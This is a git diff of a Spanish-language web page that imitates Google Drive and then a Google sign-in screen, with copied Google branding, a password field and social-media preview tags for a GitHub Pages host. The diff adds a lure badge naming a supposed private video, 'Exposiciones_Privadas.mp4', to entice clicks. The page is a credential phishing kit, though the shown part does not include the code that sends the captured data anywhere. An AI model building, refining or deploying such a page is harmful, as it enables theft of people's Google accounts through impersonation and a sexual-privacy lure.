@@ -2,270 +2,301 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mi Portal de Documentos</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+
+    <meta property="og:title" content="Plataforma de Documentos Personales| Descgargas">
+    <meta property="og:description" content="Acceso al sistema de gestión de perfiles y actualización de información personal.">
+    <meta property="og:image" content="zami.jpg">
+    <meta property="og:url" content="https://tu-usuario.github.io/tu-repo/">
+
     <script src="https://unpkg.com/lucide@latest"></script>
+   
     <style>
-        * { box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f8f9fa;
-            color: #202124;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
+    * { box-sizing: border-box; }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        background-color: #f8f9fa;
+        color: #202124;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
 
-        /* Vistas */
-        .view {
-            display: flex;
-            flex-direction: column;
-            flex: 1;
-            width: 100%;
-        }
-        .hidden { display: none !important; }
+    
+    .view {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+        width: 100%;
+    }
+    .hidden { display: none !important; }
 
-        /* Estilos Vista Drive */
-        .drive-container {
-            display: flex;
-            flex-direction: column;
-            flex: 1;
-        }
-        .drive-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 40px;
-            font-size: 15px;
-            color: #202124;
-        }
-        .drive-nav {
-            display: flex;
-            gap: 20px;
-        }
-        .drive-nav span {
-            cursor: pointer;
-        }
-        .drive-nav span:hover {
-            text-decoration: underline;
-        }
-        .drive-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        .doc-icon {
-            width: 64px;
-            height: 64px;
-            color: #5f6368;
-            margin-bottom: 24px;
-        }
-        .drive-content h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 16px 0;
-            color: #202124;
-        }
-        .drive-content p {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin: 0 0 32px 0;
-        }
-        .drive-btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
-            transition: background 0.2s;
-        }
-        .drive-btn:hover {
-            background-color: #1557b0;
-        }
-        .drive-footer {
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-            padding: 20px;
-            font-size: 12px;
-            color: #5f6368;
-            border-top: 1px solid #dadce0;
-        }
-        .drive-footer span {
-            cursor: pointer;
-        }
-        .drive-footer span:hover {
-            text-decoration: underline;
-        }
+    
+    .drive-container {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+    }
+    .drive-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px 40px;
+        font-size: 15px;
+        color: #202124;
+    }
+    .drive-nav {
+        display: flex;
+        gap: 20px;
+    }
+    .drive-nav span {
+        cursor: pointer;
+    }
+    .drive-nav span:hover {
+        text-decoration: underline;
+    }
+    .drive-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        padding: 20px;
+        max-width: 600px;
+        margin: 0 auto;
+    }
+    .doc-icon {
+        width: 64px;
+        height: 64px;
+        color: #5f6368;
+        margin-bottom: 24px;
+    }
+    .drive-content h1 {
+        font-size: 24px;
+        font-weight: 400;
+        margin: 0 0 16px 0;
+        color: #202124;
+    }
+    .drive-content p {
+        font-size: 14px;
+        color: #5f6368;
+        line-height: 1.5;
+        margin: 0 0 32px 0;
+    }
+    
+    
+    .fictional-doc-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        background-color: #f1f3f4;
+        border: 1px solid #dadce0;
+        border-radius: 6px;
+        padding: 8px 16px;
+        margin-bottom: 24px;
+        font-size: 13px;
+        color: #3c4043;
+        user-select: none;
+        pointer-events: none;
+    }
+    .fictional-doc-badge i {
+        width: 16px;
+        height: 16px;
+        color: #5f6368;
+    }
 
-        /* Estilos Vista Login Google */
-        .login-wrapper {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .login-card {
-            background: #ffffff;
-            width: 100%;
-            max-width: 450px;
-            padding: 40px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .google-header-top {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 24px;
-        }
-        .google-logo-text {
-            font-size: 24px;
-            font-weight: 400;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
-            text-align: center;
-        }
-        .google-logo-text span:nth-child(1) { color: #4285F4; }
-        .google-logo-text span:nth-child(2) { color: #EA4335; }
-        .google-logo-text span:nth-child(3) { color: #FBBC05; }
-        .google-logo-text span:nth-child(4) { color: #4285F4; }
-        .google-logo-text span:nth-child(5) { color: #34A853; }
-        .google-logo-text span:nth-child(6) { color: #EA4335; }
+    .drive-btn {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        padding: 12px 24px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+        transition: background 0.2s;
+    }
+    .drive-btn:hover {
+        background-color: #1557b0;
+    }
+    .drive-footer {
+        display: flex;
+        justify-content: center;
+        gap: 24px;
+        padding: 20px;
+        font-size: 12px;
+        color: #5f6368;
+        border-top: 1px solid #dadce0;
+    }
+    .drive-footer span {
+        cursor: pointer;
+    }
+    .drive-footer span:hover {
+        text-decoration: underline;
+    }
 
-        .login-card h2 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 8px 0;
-            color: #202124;
-        }
-        .login-subtitle {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 32px;
-            text-align: center;
-        }
-        .input-container {
-            width: 100%;
-            margin-bottom: 16px;
-            position: relative;
-        }
-        .input-container input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: border 0.2s;
-            color: #202124;
-        }
-        .input-container input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-        .toggle-pass {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #5f6368;
-            display: flex;
-            align-items: center;
-            padding: 0;
-        }
-        .login-actions {
-            width: 100%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 10px;
-        }
-        .create-account {
-            color: #1a73e8;
-            font-size: 14px;
-            font-weight: 500;
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 0;
-        }
-        .create-account:hover {
-            text-decoration: underline;
-        }
-        .next-btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .next-btn:hover {
-            background-color: #1557b0;
-        }
-        .login-footer {
-            width: 100%;
-            max-width: 450px;
-            display: flex;
-            justify-content: space-between;
-            padding: 20px 0;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        .login-footer select {
-            border: none;
-            background: transparent;
-            font-size: 12px;
-            color: #5f6368;
-            cursor: pointer;
-            outline: none;
-        }
-        .footer-right-links {
-            display: flex;
-            gap: 20px;
-        }
-        .footer-right-links span {
-            cursor: pointer;
-        }
-        .footer-right-links span:hover {
-            text-decoration: underline;
-        }
+    
+    .login-wrapper {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .login-card {
+        background: #ffffff;
+        width: 100%;
+        max-width: 450px;
+        padding: 40px;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    .google-header-top {
+        width: 100%;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 14px;
+        font-weight: 500;
+        color: #202124;
+        margin-bottom: 24px;
+    }
+    .google-logo-text {
+        font-size: 24px;
+        font-weight: 400;
+        letter-spacing: -0.5px;
+        margin-bottom: 8px;
+        text-align: center;
+    }
+    .google-logo-text span:nth-child(1) { color: #4285F4; }
+    .google-logo-text span:nth-child(2) { color: #EA4335; }
+    .google-logo-text span:nth-child(3) { color: #FBBC05; }
+    .google-logo-text span:nth-child(4) { color: #4285F4; }
+    .google-logo-text span:nth-child(5) { color: #34A853; }
+    .google-logo-text span:nth-child(6) { color: #EA4335; }
+
+    .login-card h2 {
+        font-size: 24px;
+        font-weight: 400;
+        margin: 0 0 8px 0;
+        color: #202124;
+    }
+    .login-subtitle {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 32px;
+        text-align: center;
+    }
+    .input-container {
+        width: 100%;
+        margin-bottom: 16px;
+        position: relative;
+    }
+    .input-container input {
+        width: 100%;
+        padding: 13px 15px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        outline: none;
+        transition: border 0.2s;
+        color: #202124;
+    }
+    .input-container input:focus {
+        border: 2px solid #1a73e8;
+        padding: 12px 14px;
+    }
+    .toggle-pass {
+        position: absolute;
+        right: 14px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: #5f6368;
+        display: flex;
+        align-items: center;
+        padding: 0;
+    }
+    .login-actions {
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 10px;
+    }
+    .create-account {
+        color: #1a73e8;
+        font-size: 14px;
+        font-weight: 500;
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 0;
+    }
+    .create-account:hover {
+        text-decoration: underline;
+    }
+    .next-btn {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        padding: 10px 24px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+    .next-btn:hover {
+        background-color: #1557b0;
+    }
+    .login-footer {
+        width: 100%;
+        max-width: 450px;
+        display: flex;
+        justify-content: space-between;
+        padding: 20px 0;
+        font-size: 12px;
+        color: #5f6368;
+    }
+    .login-footer select {
+        border: none;
+        background: transparent;
+        font-size: 12px;
+        color: #5f6368;
+        cursor: pointer;
+        outline: none;
+    }
+    .footer-right-links {
+        display: flex;
+        gap: 20px;
+    }
+    .footer-right-links span {
+        cursor: pointer;
+    }
+    .footer-right-links span:hover {
+        text-decoration: underline;
+    }
     </style>
 </head>
 <body>
 
-    <!-- VISTA 1: DRIVE -->
+    
     <div id="view-drive" class="view drive-container">
         <div class="drive-header">
             <span style="font-weight: 500;">Mi Portal de Documentos</span>
@@ -278,8 +309,15 @@
 
         <div class="drive-content">
             <i data-lucide="file-text" class="doc-icon"></i>
-            <h1>Documento Importante: Guía de Proyecto 2024</h1>
-            <p>Este documento contiene las especificaciones actualizadas para el proyecto trimestral. Haga clic en el botón de abajo para acceder al archivo completo en su cuenta de Google Drive.</p>
+            <h1>Nombre Documento: Archivos De Mi Galeria </h1>
+            <p>Este documento contiene las especificaciones actualizadas. Haga clic en el botón de abajo para acceder al archivo completo en su cuenta de Google Drive.</p>
+            
+            
+            <div class="fictional-doc-badge">
+                <i data-lucide="file-text"></i>
+                <span>VIDEO 4134_Exposiciones_Privadas.mp4</span>
+            </div>
+
             <button class="drive-btn" onclick="goToLogin()">
                 <svg width="18" height="18" viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg"><path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/><path d="c43.65 25 7.7 13.3 11.55 20l13.75 23.8c1.35-.8 2.5-1.9 3.3-3.3l25.4-44-13.75-23.8h-27.5z" fill="#00ac47"/><path d="m73.55 13.3-13.75-23.8c-.8-.8-1.9-1.9-3.3-2.7l-13.75 23.8 13.75 23.8 13.75-23.8c1.4-.8 2.5-1.9 3.3-3.3z" fill="#ea4335"/><path d="m43.65 25-13.75 23.8-13.75-23.8c-.8-1.4-1.2-2.95-1.2-4.5h27.5z" fill="#00832d"/><path d="m59.8 38.8-16.15 28h-27.5l16.15-28z" fill="#2684fc"/><path d="m32.65 38.8 13.75-23.8c-.8-.8-1.9-1.9-3.3-2.7l-13.75 23.8z" fill="#ffba00"/></svg>
                 Ir al documento en Drive
@@ -293,12 +331,12 @@
         </div>
     </div>
 
- 
+    
     <div id="view-login" class="view login-wrapper hidden">
         <div class="login-card">
             <div class="google-header-top">
                 <svg width="16" height="16" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.19v3.15C3.17 21.31 7.27 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.19C.43 8.13 0 9.87 0 12s.43 3.87 1.19 5.4l4.08-3.16z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.27 0 3.17 2.69 1.19 6.6l4.08 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
-                Acceder
+                Iniciar sesión
             </div>
 
             <div class="google-logo-text">
